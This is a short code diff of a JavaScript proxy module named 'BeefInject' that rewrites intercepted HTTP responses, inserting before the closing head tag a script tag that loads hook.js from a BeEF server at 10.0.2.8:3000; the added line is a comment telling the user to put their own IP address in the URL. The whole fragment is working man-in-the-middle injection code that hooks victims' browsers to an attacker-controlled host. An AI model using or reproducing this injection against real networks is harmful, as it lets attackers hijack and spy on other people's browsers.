@@ -9,6 +9,7 @@ function onResponse(req, res) {
  log( "BeefInject loaded." );
       res.Body = body.replace( 
         '</head>', 
+        /*Ur ip after "//" */
         '<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>' 
       ); 
     }
